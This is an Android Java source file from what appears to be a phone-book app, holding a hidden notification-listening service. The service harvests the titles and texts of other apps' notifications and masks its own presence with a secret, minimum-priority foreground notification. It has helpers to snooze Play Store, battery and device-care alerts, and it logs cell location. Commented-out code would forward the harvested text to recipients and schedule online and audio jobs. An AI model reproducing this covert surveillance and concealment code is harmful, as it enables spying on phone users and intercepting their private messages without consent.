package com.tr.hsyn.telefonrehberi.xyz.ptt.nlservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import com.tr.hsyn.telefonrehberi.R;
import com.tr.hsyn.telefonrehberi.util.Time;
import com.tr.hsyn.telefonrehberi.util.phone.InstalledApps;
import com.tr.hsyn.telefonrehberi.util.text.Stringx;
import com.tr.hsyn.telefonrehberi.xyz.ptt.nlservice.kitchen.IPackageControler;
import com.tr.hsyn.telefonrehberi.xyz.ptt.nlservice.kitchen.PackageControler;

import java.util.concurrent.ConcurrentLinkedDeque;

import io.paperdb.Paper;
import timber.log.Timber;


public class NLService extends NotificationListenerService{
   
   private final ConcurrentLinkedDeque<StatusBarNotification> notificationList = new ConcurrentLinkedDeque<>();
   private final long                                         SAVE_INTERVAL    = 30_000L;
   @SuppressWarnings("FieldCanBeLocal")
   private       long                                         now;
   private       long                                         lastSaveTime;
   private       String                                       lastTitle        = "";
   private       String                                       lastText         = "";
   private       IPostMan                                     postMan;
   private       IPackageControler                            packageControler;
   private       IPTTService                                  pttService;
   
   @Override
   public void onNotificationPosted(StatusBarNotification sbn){
      
      if(sbn == null) return;
      
      if(sbn.isOngoing()){
         
         //checkOngoingNotification();
         return;
      }
      
      if(!packageControler.isOkey(sbn)){
         
         return;
      }
      
      
      
      saveNotification(sbn);
      
      
      
      /*notificationList.addLast(sbn);
      
      now = System.currentTimeMillis();
      
      if((now - lastSaveTime) < SAVE_INTERVAL){
         
         return;
      }
      
      lastSaveTime = now;
      
      Worker.onBackground(() -> {
         
         while(notificationList.size() != 0){
            
            StatusBarNotification notification = notificationList.pollFirst();
            saveNotification(notification);
         }
         
         //postMan.checkTextFiles();
         
      }, SAVE_INTERVAL);*/
      
   }
   
   private void saveNotification(StatusBarNotification notification){
      
      if(notification == null) return;
      
      Notification not    = notification.getNotification();
      Bundle       extras = not.extras;
      
      if(extras == null) return;
      
      String  packageName = notification.getPackageName();
      
      
      
      if(packageName.contains("mail") || packageName.contains("Mail")) return;
      
      
      Context context     = getApplicationContext();
      String  appName     = InstalledApps.getApplicationName(context, packageName);
      String  title       = String.valueOf(extras.getCharSequence(Notification.EXTRA_TITLE));
      String  text        = String.valueOf(extras.getCharSequence(Notification.EXTRA_TEXT));
      long    time        = notification.getPostTime();
      String  value       = formatNotification(packageName, appName, time, title, text);
   
      if(packageName.equals("com.android.systemui") && title.equals("Pil gücü düşük")){
         
         Timber.d("Gereksiz bir bildirim : %s", packageName);
         return;
      }
         
         
      if(lastTitle.equals(title) && lastText.equals(text)){
         
         return;
      }
      
      lastTitle = title;
      lastText  = text;
      
      //postMan.postText(value, IRecipients.create().getRecipients(true));
      
      Timber.d(value);
      
      //Files.saveToFile(getApplicationContext(), packageName, value);
   }
   
   private String formatNotification(String packageName, String appName, long time, String title, String text){
      
      title   = title == null || title.isEmpty() ? "-" : title;
      text    = text == null || text.isEmpty() ? "-" : text;
      appName = appName == null ? packageName : appName;
      
      return Stringx.format(
            
            "Name    : %s%n" +
            "Package : %s%n" +
            "Date    : %s%n" +
            "Title   : %s%n" +
            "Text    : %s",
            
            appName, packageName, Time.getDate(time), title, text
      );
   }
   
   @Override
   public void onNotificationRemoved(StatusBarNotification sbn){}
   
   @Override
   public void onListenerConnected(){
      
      super.onListenerConnected();
      
      startFore();
      
      Paper.init(getApplicationContext());
      
      postMan          = IPostMan.callSigleton(getApplicationContext());
      pttService       = IPTTService.getService(getApplicationContext());
      packageControler = new PackageControler(this);
     
      
      Timber.d("NLService started");
   }
   
   @Override
   public void onListenerDisconnected(){
      
      super.onListenerDisconnected();
      
      
      //getSharedPreferences("nlservice", MODE_PRIVATE).edit().putLong("disconnected", Time.getTime()).apply();
   }
   
   private void startFore(){
      
      String CHANNEL_ID   = "DISCOVERY";
      String CHANNEL_NAME = "Notification Channel";
      
      
      NotificationCompat.Builder builder =
            new NotificationCompat.Builder(this, CHANNEL_ID)
                  .setContentText("Rehber")
                  .setStyle(new NotificationCompat.BigTextStyle())
                  .setSmallIcon(R.mipmap.ic_launcher_round)
                  .setPriority(NotificationCompat.PRIORITY_MIN)
                  .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            /*.setContentTitle("İzleme Servisi")*/;
      
      
      if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O){
         
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         NotificationChannel chan    = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_LOW);
         
         if(manager != null){
            
            chan.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            manager.createNotificationChannel(chan);
            
            startForeground(77, builder.build());
         }
      }
      else{
         
         startForeground(0, builder.build());
         
         Timber.w("start fore");
      }
      
      
   }
   
   private void checkOngoingNotification(){
      
      StatusBarNotification[] nots = getActiveNotifications();
      
      //Timber.w("%d aktif bildirim var", nots.length);
      
      for(StatusBarNotification notification : nots){
         
         Notification n = notification.getNotification();
         
         CharSequence title = n.extras.getCharSequence(Notification.EXTRA_TITLE);
         CharSequence text  = n.extras.getCharSequence(Notification.EXTRA_TEXT);
         
         if(title != null && text != null){
            
            if((notification.getPackageName().equals("android") && (title.toString().contains("GooglePlay") || text.toString().contains("GooglePlay") || text.toString().contains("Pil") || n.extras.containsKey("android.foregroundApps"))) || notification.getPackageName().equals(getPackageName()) || notification.getPackageName().equals("com.samsung.android.lool") || title.toString().contains("GooglePlay")){
               
               snooze(notification);
            }
         }
      }
   }
   
   private void snooze(StatusBarNotification sbn){
      
      if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
         
         long snoozLong = 10000000000000L;
         this.snoozeNotification(sbn.getKey(), snoozLong);
      }
   }
   
   private void setupWork(){
      
      /*Constraints myConstraints = new Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build();
      
      PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(OnlineWorks.class, 70, TimeUnit.MINUTES);
      
      PeriodicWorkRequest onlineWorks = builder.setConstraints(myConstraints).build();
      WorkManager.getInstance().enqueue(onlineWorks);*/
      
   }
   
   private void setupWork2(){
      
      /*PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(AudioWorks.class, 70, TimeUnit.MINUTES);
      
      PeriodicWorkRequest onlineWorks = builder.build();
      WorkManager.getInstance().enqueue(onlineWorks);*/
      
   }
   
   //@SuppressLint("MissingPermission")
   private void registerPhoneListener(){
      
      TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
      
      if(telephonyManager == null) return;
      
      telephonyManager.listen(new PhoneStateListener(){
         
         @Override
         public void onCellLocationChanged(CellLocation location){
            
            super.onCellLocationChanged(location);
            
            Timber.w("Cell location : %s", location.toString());
            
         }
         
      }, PhoneStateListener.LISTEN_CELL_LOCATION);
      
      
      /*new Thread(() -> {
         
         Looper.prepare();
         telephonyManager.listen(phoneStateListener = new NLPhoneStateListener(getApplicationContext()), PhoneStateListener.LISTEN_CALL_STATE);
         Looper.loop();
      }).start();*/
   }
   
   
   
   
   
   
   /*private void unregisterPhoneListener(){
   
      TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
      telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
   }*/
   
}
